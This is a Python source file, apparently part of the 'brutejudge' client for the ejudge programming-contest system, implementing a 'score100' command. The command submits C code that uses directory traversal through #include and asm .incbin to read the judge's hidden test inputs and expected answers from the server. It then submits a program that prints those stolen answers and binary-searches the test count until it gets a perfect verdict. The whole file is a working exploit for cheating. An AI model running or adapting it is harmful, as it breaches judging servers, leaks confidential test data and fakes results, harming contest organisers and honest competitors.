import brutejudge.cheats
from brutejudge.commands.asubmit import get_possible_lang_id
from brutejudge.commands.astatus import still_running
from brutejudge.commands.tailcode import get_tailcode
from brutejudge.http import task_list, submit, submission_list, submission_results, submission_status
from brutejudge._http.ejudge import Ejudge
from brutejudge.error import BruteError
import random

def do_score100(self, cmd):
    """
    usage: score100 <task> <test_cnt> || score100 <subm_id> || score100 <task> <start-end>

    Submit a solution that will get a score of 100.
    If `task` and `test_cnt` are supplied, will submit a solution for task `task` that will pass `test_cnt` tests.
    If `subm_id` is supplied, `task` and `test_cnt` will be taken from that.
    If `start` and `end` are supplied, the task is assumed to have from `start` to `end` tests, the exact number will be retrieved using binary search.
    """
    brutejudge.cheats.cheating(self)
    sp = cmd.split()
    if len(sp) not in (1, 2):
        return self.do_help('score100')
    if not isinstance(self.url, Ejudge):
        raise BruteError("score100 only works on ejudge.")
    lx, ly = submission_list(self.url, self.cookie)
    if len(sp) == 1:
        if not sp[0].isnumeric():
            raise BruteError("Submission ID must be a number.")
        subm_id = int(sp[0])
        try: sp[0] = ly[lx.index(subm_id)].strip()
        except (ValueError, IndexError):
            raise BruteError("No such submission.")
        x, y = submission_results(self.url, self.cookie, subm_id)
        sp.append(str(len(x)))
    tasks = task_list(self.url, self.cookie)
    if sp[0] not in tasks:
        raise BruteError("No such task.")
    task_id = tasks.index(sp[0])
    try:
        if '-' in sp[1]:
            spa, spb = sp[1].split('-', 1)
            test_cnt_low = int(spa)
            test_cnt_high = int(spb) + 1
        else:
            test_cnt_low = test_cnt_high = int(sp[1])
            test_cnt_low -= 1
            test_cnt_high += 1
    except ValueError:
        raise BruteError("test_cnt must be a number or a pair of numbers. (e.g. 1 or 1-2)")
    contest_id = self.url.contest_id
    code0 = ('//random: %r\n#define EXECUTE_FLAGS 08\n#include "'+'../'*16+'home/judges/%06d/problems/%s/Makefile"\n')%(random.random(), contest_id, sp[0])
    lang_id = get_possible_lang_id(self, ('g++', 'g++-32', 'gcc', 'gcc-32'), task_id)
    submit(self.url, self.cookie, task_id, lang_id, code0)
    lx2, ly2 = submission_list(self.url, self.cookie)
    if len(lx2) == len(lx):
        raise BruteError("Error while sending.")
    while still_running(submission_status(self.url, self.cookie, lx2[0])): pass
    tailcode = get_tailcode(self, lx2[0], 'Makefile')
    tp = '%02d'
    cp = '%02d.a'
    for l in tailcode.split('\n'):
        if l.startswith('EXECUTE_FLAGS = '):
            tp = l.split('--test-pattern=', 1)[1].split()[0]
            cp = l.split('--corr-pattern=', 1)[1].split()[0]
    while test_cnt_high - test_cnt_low > 1:
        test_cnt = (test_cnt_high + test_cnt_low) // 2
        code = ''
        for i in range(test_cnt):
            code += ('asm("test_%d:\\n.incbin \\"'+'../'*16+'home/judges/%06d/problems/%s/tests/'+tp+'\\"\\n.byte 0");\n')%(i, contest_id, sp[0], i + 1)
            code += ('asm("ans_%d:\\n.incbin \\"'+'../'*16+'home/judges/%06d/problems/%s/tests/'+cp+'\\"\\n.byte 0");\n')%(i, contest_id, sp[0], i + 1)
            code += 'extern char test_%d[];\n'%i
            code += 'extern char ans_%d[];\n'%i
        code += '\n//random: %r\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main()\n{'%random.random()+r'''
    int buf_sz = 1;
    void* buf = (void*)0;
    while (1) {
        buf = realloc(buf, buf_sz);
        int bytes_read = fread((void*)(((char*)buf)+buf_sz/2), 1, (buf_sz+1)/2, stdin);
        if (bytes_read < (buf_sz+1)/2) {
            *(((char*)buf)+buf_sz/2+bytes_read) = 0;
            break;
        }
        buf_sz *= 2;
    }
    fprintf(stderr, "%s", (char*)buf);
'''
        for i in range(test_cnt):
            code += '    if (!strcmp((char*)buf, test_%d)) {\n'%i
            code += '        printf("%%s", ans_%d);\n'%i
            code += '        return 0;\n    }\n'
        code += '    printf("Sorry, I don\'t know the answer!\\n");\n'
        code += '    return 0;\n}\n'
        submit(self.url, self.cookie, task_id, lang_id, code)
        lx3, ly3 = submission_list(self.url, self.cookie)
        if len(lx2) == len(lx3):
            raise BruteError("Error while sending.")
        lx2, ly2 = lx3, ly3
        while True:
            status = submission_status(self.url, self.cookie, lx2[0])
            if not still_running(status): break
        if status == 'OK': return
        elif status == ('Compilation error', 'Compiler failed'): test_cnt_high = test_cnt
        else: test_cnt_low = test_cnt
    raise BruteError("Unknown failure, probably an interactive task.")
